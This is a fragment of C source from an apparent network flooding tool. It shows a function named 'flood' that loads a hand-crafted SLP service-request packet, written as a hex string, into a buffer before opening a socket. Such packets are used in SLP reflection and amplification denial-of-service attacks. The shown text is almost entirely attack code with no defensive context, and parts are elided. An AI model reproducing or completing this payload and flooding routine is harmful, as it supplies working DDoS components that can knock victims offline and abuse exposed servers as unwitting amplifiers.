...
void *flood(void *par1)
{
        ...
        memcpy(buf, "\x02\x01\x00\x00\x36\x20\x00\x00\x00\x00\x00\x01\x00\x02en\x00\x00\x00\x15\x73\x65\x72\x76\x69\x63\x65\x3a\x73\x65\x72\x76\x69\x63\x65\x2d\x61\x67\x65\x6e\x74\x00\x07\x64\x65\x66\x61\x75\x6c\x74\x00\x00\x00\x00", 52);
        int sizeofpayload = 52;
        int sock;
